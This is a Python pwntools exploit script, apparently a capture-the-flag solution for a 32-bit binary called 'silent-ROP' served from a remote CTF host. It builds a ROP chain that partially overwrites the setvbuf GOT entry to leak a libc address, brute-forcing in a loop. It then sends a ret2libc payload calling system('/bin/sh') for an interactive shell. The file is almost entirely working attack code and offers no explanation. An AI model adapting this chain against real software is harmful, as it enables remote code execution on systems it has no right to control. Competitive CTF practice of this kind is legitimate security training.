#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./silent-ROP_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    r = process([exe.path])
    return r


def main():
    #r = conn()
    r = remote("ctf.k3rn3l4rmy.com", 2202)
    
    clean_stack = 0x080492c1

    payload  = cyclic_metasploit(0x20-4)
    payload += p32(exe.plt['read'])
    payload += p32(clean_stack)
    payload += p32(0)
    payload += p32(exe.got['setvbuf'])
    payload += p32(0x2)

    payload += p32(exe.plt['setvbuf'])
    payload += p32(clean_stack + 2)
    payload += p32(exe.got['setvbuf'])
    payload += p32(exe.sym['vuln'])
    #pause()
    r.sendline(payload)
    
    # Trying to convert setvbuf into puts. (4 bits bruteforce)
    #pause()
    sleep(1)
    r.send(p16(0xbcd0))

    puts = u32(r.recv(4))
    log.info("Puts leak @ 0x%x", puts)
    libc.address = puts - 0x71cd0
    log.warn("Libc base @ 0x%x", libc.address)
    
    payload = b"A"*(0x20 - 4)
    payload += p32(libc.sym['system'])
    payload += b"AAAA"
    payload += p32(next(libc.search(b"/bin/sh")))
    
    sleep(1)
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    while True:
        try:
            main()
        except:
            pass
